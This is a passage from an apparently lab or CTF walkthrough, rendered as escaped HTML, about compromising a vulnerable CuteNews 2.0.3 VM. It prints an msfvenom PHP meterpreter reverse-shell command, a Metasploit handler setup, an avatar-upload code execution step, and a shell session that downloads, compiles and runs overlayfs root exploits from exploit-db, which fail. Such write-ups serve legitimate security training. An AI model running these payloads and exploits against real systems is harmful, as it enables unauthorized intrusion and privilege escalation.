&lt;span class="code-line"&gt;&lt;span class="n"&gt;Nmap&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nl"&gt;done&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;IP&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;address&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;host&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;up&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;scanned&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;in&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;2.60&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;seconds&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;There seems once more that only the port 80 with a HTTP service is available.&lt;/p&gt;
&lt;h2 id="web"&gt;Web&lt;/h2&gt;
&lt;p&gt;We go to the website. We notice that it is powered by CuteNews 2.0.3 (look at
the footer). We search on internet for vulnerability and found
&lt;a href="https://www.exploit-db.com/exploits/37474/"&gt;one&lt;/a&gt;.
This vulnerability allow the execute PHP code by uploading a malicious avatar.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Simple homepage" src="/media/2016.05/simple1.png"&gt;&lt;/p&gt;
&lt;p&gt;We create an account in order to upload our avatar.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Simple account page" src="/media/2016.05/simple2.png"&gt;&lt;/p&gt;
&lt;p&gt;We generate a PHP meterpreter using &lt;code&gt;msfvenom&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;msfvenom -p php/meterpreter/reverse_tcp LHOST=10.0.2.15 LPORT=4444 -e php/base64 -f raw &amp;gt; /tmp/shell.php&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We prepare our metasploit for the callback:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;msf&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;use&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;exploit&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;multi&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;handler&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;msf&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;exploit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;handler&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;set&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;payload&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;php&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;meterpreter&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;reverse_tcp&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;payload&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&amp;gt;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;php&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;meterpreter&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;reverse_tcp&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;msf&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;exploit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;handler&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;set&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;LHOST&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;10.0&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="mf"&gt;2.5&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;LHOST&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&amp;gt;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;10.0&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="mf"&gt;2.5&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;msf&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;exploit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;handler&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;set&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;LPORT&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;4444&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;LPORT&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&amp;gt;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;4444&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;msf&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;exploit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;handler&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;exploit&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Started&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;reverse&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;handler&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;on&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;10.0&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="mf"&gt;2.5&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;4444&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Starting&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;the&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;payload&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;handler&lt;/span&gt;&lt;span class="o"&gt;...&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We upload our msfvenom's payload as our avatar.&lt;/p&gt;
&lt;p&gt;We go to &lt;code&gt;http://10.0.2.5/uploads/avatar_john_shell.php&lt;/code&gt; and we got our
meterpreter!
Let's see what this box is made of:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;uname -a&lt;/span&gt;
&lt;span class="code-line"&gt;Linux simple 3.16.0-30-generic #40~14.04.1-Ubuntu SMP Thu Jan 15 17:45:15 UTC 2015 i686 i686 i686 GNU/Linux&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Once more an Ubuntu 14.04, like the droopy from yesterday.&lt;/p&gt;
&lt;h2 id="privileges-escalation"&gt;Privileges escalation&lt;/h2&gt;
&lt;h3 id="cve-2015-1328-exploiting-overlayfs"&gt;CVE-2015-1328 exploiting overlayFS&lt;/h3&gt;
&lt;p&gt;Let us try once again to exploit the CVE-2015-1328 exploiting overlayFS to get
a root shell on the machine. I started a shell from the meterpreter, download
the exploit, compile it, run it and failed it:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;meterpreter&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;shell&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;Process&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;1335&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;created&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;Channel&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;created&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;id&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;uid&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;33&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;www&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;gid&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;33&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;www&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;groups&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;33&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;www&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;wget&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;https&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;//&lt;/span&gt;&lt;span class="n"&gt;www&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;exploit&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;db&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;download&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="mi"&gt;37292&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="mi"&gt;2016&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;05&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;11&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;09&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;59&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;52&lt;/span&gt;&lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="n"&gt;https&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;//&lt;/span&gt;&lt;span class="n"&gt;www&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;exploit&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;db&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;download&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="mi"&gt;37292&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;Resolving&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;www&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;exploit&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;db&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;www&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;exploit&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;db&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;...&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;192.124&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="mf"&gt;249.8&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;Connecting&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;to&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;www&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;exploit&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;db&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;www&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;exploit&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;db&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="mf"&gt;192.124&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="mf"&gt;249.8&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mf"&gt;443.&lt;/span&gt;&lt;span class="o"&gt;..&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;connected&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;HTTP&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;sent&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;awaiting&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="o"&gt;...&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;200&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;OK&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;Length&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;5123&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mf"&gt;5.0&lt;/span&gt;&lt;span class="n"&gt;K&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;application&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;txt&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;Saving&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;to&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;37292&amp;#39;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;K&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;.....&lt;/span&gt;&lt;span class="w"&gt;                                                 &lt;/span&gt;&lt;span class="mi"&gt;100&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="mi"&gt;409&lt;/span&gt;&lt;span class="n"&gt;M&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="mi"&gt;2016&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;05&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;11&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;09&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;59&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;53&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;409&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;MB&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;37292&amp;#39;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;saved&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;5123&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="mi"&gt;5123&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;mv&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;37292&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;ofs&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;gcc&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;ofs&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;o&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;ofs&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;ls&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;avatar_john_shell&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;php&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;ofs&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;ofs&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;chmod&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;ofs&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;./&lt;/span&gt;&lt;span class="n"&gt;ofs&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;spawning&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;threads&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;mount&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="c1"&gt;#1&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;mount&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="c1"&gt;#2&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;child&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;threads&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;done&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;exploit&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;failed&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;When searching for exploit regarding linux 3.16.0 I found the CVE-2014-5207:&lt;/p&gt;
&lt;h3 id="cve-2014-5207-fuse-based-exploit"&gt;CVE-2014-5207 Fuse-based exploit&lt;/h3&gt;
&lt;p&gt;&lt;a href="https://www.exploit-db.com/exploits/34923/"&gt;CVE-2014-5207 Fuse-based exploit&lt;/a&gt;.
I download the exploit, compiled it and once more failed it:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;gcc -Wall fuse_suid.c `pkg-config fuse --cflags --libs` -o fuse_suid&lt;/span&gt;
&lt;span class="code-line"&gt;/bin/sh: 1: pkg-config: not found&lt;/span&gt;
&lt;span class="code-line"&gt;fuse_suid.c:21:18: fatal error: fuse.h: No such file or directory&lt;/span&gt;
&lt;span class="code-line"&gt;#include &amp;lt;fuse.h&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;                  ^&lt;/span&gt;
&lt;span class="code-line"&gt;compilation terminated&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;When searching for &lt;code&gt;ubuntu 14.04 privilege escalation exploit&lt;/code&gt; I found two
interesting exploits :
 * CVE-2015-3643
 * CVE-2015-1318 + CVE-2015-1862&lt;/p&gt;
&lt;h3 id="cve-2015-3643"&gt;CVE-2015-3643&lt;/h3&gt;
&lt;p&gt;&lt;a href="https://www.exploit-db.com/exploits/36820/"&gt;The CVE-2015-3643&lt;/a&gt; exploit the
D-Bus listening on com.ubuntu.USBCreator.
I try this exploit but the module was not available and failed:&lt;/p&gt;
